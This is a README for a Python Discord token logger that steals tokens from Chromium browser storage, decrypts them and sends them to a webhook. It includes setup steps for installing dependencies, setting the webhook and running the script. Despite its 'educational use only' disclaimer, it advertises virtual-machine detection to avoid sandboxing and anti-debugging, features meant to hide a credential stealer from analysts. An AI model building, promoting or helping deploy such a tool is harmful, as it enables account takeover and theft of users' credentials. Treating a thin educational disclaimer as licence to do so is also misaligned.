README.txt
==========

🛡️ Secure Token Logger (For Educational Use Only)
==================================================

DISCLAIMER:
-----------
This tool is intended **strictly for educational and ethical hacking awareness purposes only**.
Any unauthorized usage against individuals, services, or systems is **illegal and unethical**.

Overview:
---------
This project demonstrates how malicious token loggers might operate by extracting and exfiltrating Discord tokens from local storage.
Understanding such tools is critical for developing effective security measures and user protections.

Use this script to:
- Analyze how Discord token loggers typically function
- Test and validate security countermeasures
- Demonstrate the risks associated with unsecured local token storage

⚠️ Do NOT use this script on systems or data you do not own or have explicit permission to test.

Features:
---------
- Extracts locally stored Discord tokens from multiple Chromium-based browsers
- Decrypts token data using local system keys
- Sends results to a test webhook for simulated exfiltration
- Virtual machine detection to avoid sandboxing
- Clipboard monitor and anti-debugging mechanisms (for demonstration)
- Encryption example using AES

Setup:
------
1. Required Dependencies:
   - Python 3.8+
   - Install required modules with:

     pip install pycryptodome pyperclip pillow pypiwin32

2. Replace the placeholder for `WEBHOOK_URL` in `main.py` with your test webhook endpoint.

3. Run the script in a controlled environment:

     python main.py

Directory Structure:
--------------------
.
├── main.py         --> Core script (educational example)
├── README.txt      --> This file
└── /               --> No external files required

Educational Objectives:
-----------------------
- Understand how token loggers abuse browser storage
- Analyze token formats and how Discord uses them for authentication
- Explore potential mitigations (e.g., token rotation, secure storage, endpoint protection)

Responsible Disclosure:
-----------------------
If you find vulnerabilities in Discord or other applications while studying this tool, report them responsibly via proper disclosure programs.

Credits:
--------
Created for security awareness and Python scripting demonstration.
Inspired by open-source discussions on Discord token security.

GitHub:
-------
Project URL: https://github.com/deadconvicess/Discord-Token-Logger

License:
--------
MIT License - This project is open-source and available for audit, modification, and learning.

By using this tool, you agree to do so only in a legal and ethical manner.

========================================
⚠️ Unauthorized or malicious usage is strictly prohibited.
========================================
